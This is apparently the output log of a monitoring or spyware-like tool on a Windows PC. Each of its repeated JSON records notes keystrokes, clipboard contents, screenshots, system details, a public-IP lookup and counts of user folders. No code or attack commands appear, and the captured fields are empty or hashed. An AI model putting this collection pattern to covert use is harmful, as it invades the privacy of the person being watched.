{"timestamp": "2025-06-14T06:55:01.952322+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D33CB90>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "37c058a0f6de1c19e72712d6ff783bb638906324476fb35551a1bfc71a892b87", "_raw_log_hash": "b15bde5a01c1b74e3e21a4085db96099285afe95c5d29091702da14074d43564"}
{"timestamp": "2025-06-14T06:55:15.420629+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137110>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "6f33c48a9a2a1884f51ad2d38678e8cb0793d8e084cc379379f1a6c7ac4e1bd3", "_raw_log_hash": "23cc984b14b01990f3f41e64a3ddcd5f1856e14e444f0688ed3c9a006e34eebf"}
{"timestamp": "2025-06-14T06:55:28.939788+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D1374D0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "10444dee45fbf9e93c639e64e5a5d887eb178b7a5045b41f7f1272cf861a76df", "_raw_log_hash": "f4d64c9dd915b88c1f6377c1a1ceff2ccf8b244bf971e75a133a318bf5a2ccf5"}
{"timestamp": "2025-06-14T06:55:42.447986+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D33C690>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "df689e9283ce66db2667c02ee353616de0fb7c6a8845660b7df05da0bba99488", "_raw_log_hash": "4ded9dfd6594014bb6f7e814d611e8188430259f6267b1dba86443fa32cd02e0"}
{"timestamp": "2025-06-14T06:55:55.934727+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137610>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "18cef1c4287a80d243cc2d45f3acc4426f62b40c264cfb4f6ccf35c719b6df3e", "_raw_log_hash": "66c98c0820d1931567d892d6cc7c81d0f18630201cf1ce7e2bf508e64db3eb3a"}
{"timestamp": "2025-06-14T06:56:09.418629+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D1379D0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "3de756158cd118f9bb2149863a823c9b7b9c72f02225df06edaefdfb841bbf09", "_raw_log_hash": "34f90a2e6685956144a0579f660c8ac1058506aea4c0329e95ab8ded9dd59392"}
{"timestamp": "2025-06-14T06:56:22.922270+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D33C910>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "4c2b867f8dbd1c8f12bd522b1d26171a22320b75c1e30c09dfe12c8211014169", "_raw_log_hash": "792b164968cfb5ab2a8813b4b7c8673531384fdea4807f6c3cdf32cbaba5306f"}
{"timestamp": "2025-06-14T06:56:36.463429+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137ED0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "16f6483397e423c2ac9883c23084e388a3919c7d1a204640fde6ba21fa37d401", "_raw_log_hash": "99d5c9c58c079896bc6e3622a2068045c8b8101bf1e9591d622ce81e0e5e74f9"}
{"timestamp": "2025-06-14T06:56:49.990893+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137610>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "2f2e1d903f5ef668ca6fb3067ab9018f89e72f14192298e7eb73ecec997ac279", "_raw_log_hash": "5c48a7c186c45bb6d7ff7cfd11478ef4505cce5425e219bedf9896fd2e8f1629"}
{"timestamp": "2025-06-14T06:57:03.453277+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137390>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "e00ed8fa86c03f48e57973ce3f163cddc87b103318f32fd1fcc82ee922ff3834", "_raw_log_hash": "672f8ed534d0a1931f0a08ae514704b40241effd673fabec7a5e4ca767b515f8"}
{"timestamp": "2025-06-14T06:57:16.973593+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137110>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "c5fb800d228e3c86681271af18ff8feb0613c091ad02be9f8c017bfe478f94ef", "_raw_log_hash": "900c43daef651e509414e18f4875f2b70802ecc8e68cbe7539a2f8394b8ed8a5"}
{"timestamp": "2025-06-14T06:57:30.438243+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137750>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "c844e34f6ac802763acab8680a1efb449dbf1e2ae4b9caa9b01ac882dc8d2f86", "_raw_log_hash": "62b10559e03663bfde55433cf388f4dac5d3004dd453e6aa70e2833cbaf6bde4"}
{"timestamp": "2025-06-14T06:57:43.940942+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137610>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "68f4e9506e63a380a51507b76dab0c93da7752d1302821b081f8535fac51e926", "_raw_log_hash": "568fc7a8f5f06c7357e056a99af3f6fed61d5ad2ba065406b8ea8ce4b06e078e"}
{"timestamp": "2025-06-14T06:57:57.422389+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137D90>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "aa53f40901581295f37fda55b155c645334796d28cfa7c988064ff9becfe7d59", "_raw_log_hash": "7d5c34bd7ce3fd675086677a8d455f2ee8e4e1ff3477c42f77d8b3938053c981"}
{"timestamp": "2025-06-14T06:58:10.899554+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137750>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "fd2839fc2e15baae08067075a87087ece89600067c1556e08dd15f642f099d58", "_raw_log_hash": "54b65796aceecd953788ce27afde31a7b9753993e13f9d3a58833f889c9abec3"}
{"timestamp": "2025-06-14T06:58:24.361700+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D33F250>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "26a07bbd300390aa5d75412f387577d822a6d6fdaf747d62057152ef60e7c5cf", "_raw_log_hash": "645bd3327a9aa4d16a9c11c02a42f648e25520b6343535e110785a78e5e53ac0"}
{"timestamp": "2025-06-14T06:58:37.908573+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137ED0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "7f3d181db4008dafd9f5209fb8bab9a67e570d2d13f6c355dc77a91d3f3aea12", "_raw_log_hash": "a87a9b140985c8cde3621ef21cce009d9f81dd8f01d1b5d81fba22a0e3d431e9"}
{"timestamp": "2025-06-14T06:58:51.482781+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137390>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "ea3b16f7281a25b1b4e394726f288c76da85c6de3c11e6e8e4b4fe08b15163dd", "_raw_log_hash": "770aa1fee077d6e8b6d198a56d763eb173c71c5458b8a9918794cf2c2cc70866"}
{"timestamp": "2025-06-14T06:59:05.017263+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137610>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "a4763ce80b6ac6a3597617732fb35ec3312ad9d7289adb42b81edd5dec670aaf", "_raw_log_hash": "b86266cd61dec0e7838ecad7bb7a2ab22540faebc20d78d161faeb62018789f2"}
{"timestamp": "2025-06-14T06:59:18.588967+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137ED0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "9ba987814fd5ecaf702e41adcd22183af6435e740c7d91df50185480068dad3c", "_raw_log_hash": "70e6da15f42be6f32c3aece9716e605a786839976e9d10311d0f59a422836aee"}
{"timestamp": "2025-06-14T06:59:32.061037+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D33EAD0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "38f4783ac6a0e7d65a9c0a616e252e3d50c6d75aba8a80085d7b23a7bd701906", "_raw_log_hash": "b71efdcb629dc1babff4b933a4a0d40ec43aff535ce3bb9b0f1fbee2e29b08a6"}
{"timestamp": "2025-06-14T06:59:45.516168+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137110>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "7e4c976cf38c98ebd4d7bf975551cfd703d587d96581927f19f8c16be5d76563", "_raw_log_hash": "1c07fe17b6d28393c82b1d355a4f5e2a3102c8cf26f9bfacc64bde6c0ab74322"}
{"timestamp": "2025-06-14T06:59:59.051416+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137D90>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "6d2197ed1f880c678421d8d694502a853b9507a8f5c7f0679c0b7b40cfd4271f", "_raw_log_hash": "ce288ceffbd5066e3dbe38b969847d6ff65320668645dc9eae20bf6b58967ac6"}
{"timestamp": "2025-06-14T07:00:12.500381+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D1379D0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "20db9b67176efd757749d3bd4dcc7d5cb457683e1476660dff1562df4dc8bedf", "_raw_log_hash": "46635931733447a72cb25b1e67762b4ebac6b0957c3270ceb8357f9a7bd7e08f"}
{"timestamp": "2025-06-14T07:00:26.028858+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137750>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "26232a8e7f40cf877a30ab953e8b94dfcec318249d534f8fd03f0784ca2b3eac", "_raw_log_hash": "87463ff650e134403c51747f7340e70bcf137d9672e4206dea82c812e5e837ca"}
{"timestamp": "2025-06-14T07:00:39.554992+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D33CB90>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "951699cf09aa120e18ef627949158ca961bfd72854c24bbab3f60eac5c164963", "_raw_log_hash": "6e566eaec0922d8b4f782ec49d4dfec7e150a0a7b76b66edcfbc611ac20065f3"}
